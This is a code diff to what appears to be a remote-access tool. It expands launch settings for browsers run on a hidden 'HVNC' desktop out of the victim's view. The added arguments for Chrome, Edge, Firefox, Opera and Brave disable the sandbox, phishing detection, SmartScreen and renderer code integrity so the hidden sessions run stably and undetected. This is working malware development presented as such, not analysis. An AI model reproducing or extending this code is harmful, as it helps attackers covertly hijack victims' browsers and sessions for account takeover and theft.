@@ -53,7 +53,14 @@ if platform.system() == "Windows":
     GMEM_MOVEABLE = 0x0002
 
 # Browser profile paths and launch configurations
-# Extended args for stability: disable GPU issues, sync, background networking
+# Extended args for HVNC isolation - prevents connecting to existing browser process
+# Critical flags:
+# - --user-data-dir: Forces separate profile (prevents sharing with main desktop browser)
+# - --no-sandbox: Required for hidden desktop process creation
+# - --disable-gpu: Avoids GPU context issues on hidden desktop
+# - --disable-background-mode: Prevents background processes on main desktop
+# - --disable-features=RendererCodeIntegrity: Required for Win11 24H2
+# - --new-window: Forces new window instead of tab in existing browser
 BROWSER_PROFILES = {
     "chrome": {
         "paths": [
@@ -71,8 +78,22 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--disable-client-side-phishing-detection",
             "--disable-component-update",
-            "--no-sandbox",  # Required for hidden desktop
-            "--disable-gpu",  # Avoid GPU issues on hidden desktop
+            "--no-sandbox",
+            "--disable-gpu",
+            "--disable-software-rasterizer",
+            "--disable-background-mode",  # Don't run in background on main desktop
+            "--disable-backgrounding-occluded-windows",
+            "--disable-renderer-backgrounding",
+            "--disable-features=RendererCodeIntegrity,BackgroundFetch,TranslateUI",
+            "--disable-hang-monitor",
+            "--disable-ipc-flooding-protection",
+            "--disable-popup-blocking",
+            "--disable-prompt-on-repost",
+            "--disable-domain-reliability",
+            "--new-window",  # Force new window
+            "--start-maximized",
+            "--window-position=0,0",
+            "--force-device-scale-factor=1",
         ],
     },
     "firefox": {
@@ -83,7 +104,13 @@ BROWSER_PROFILES = {
             r"C:\Program Files\Mozilla Firefox\firefox.exe",
             r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
         ],
-        "args": ["-profile", "{profile_dir}", "-no-remote"],
+        "args": [
+            "-profile", "{profile_dir}",
+            "-no-remote",  # Critical: don't connect to existing Firefox
+            "-new-instance",  # Force new instance
+            "-width", "1920",
+            "-height", "1080",
+        ],
     },
     "edge": {
         "paths": [
@@ -103,7 +130,23 @@ BROWSER_PROFILES = {
             "--disable-component-update",
             "--no-sandbox",
             "--disable-gpu",
-            "--disable-features=msSmartScreenProtection",  # Disable SmartScreen
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-backgrounding-occluded-windows",
+            "--disable-renderer-backgrounding",
+            "--disable-features=msSmartScreenProtection,RendererCodeIntegrity,BackgroundFetch,EdgeCollections,msEdgeCollections",
+            "--disable-hang-monitor",
+            "--disable-ipc-flooding-protection",
+            "--disable-popup-blocking",
+            "--disable-prompt-on-repost",
+            "--disable-domain-reliability",
+            "--inprivate",  # InPrivate mode - extra isolation
+            "--new-window",
+            "--start-maximized",
+            "--window-position=0,0",
+            "--force-device-scale-factor=1",
+            "--disable-edge-collections",
+            "--disable-reading-list",
         ],
     },
     "opera": {
@@ -122,6 +165,11 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--no-sandbox",
             "--disable-gpu",
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-features=RendererCodeIntegrity",
+            "--new-window",
+            "--start-maximized",
         ],
     },
     "brave": {
@@ -140,6 +188,11 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--no-sandbox",
             "--disable-gpu",
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-features=RendererCodeIntegrity",
+            "--new-window",
+            "--start-maximized",
         ],
     },
 }
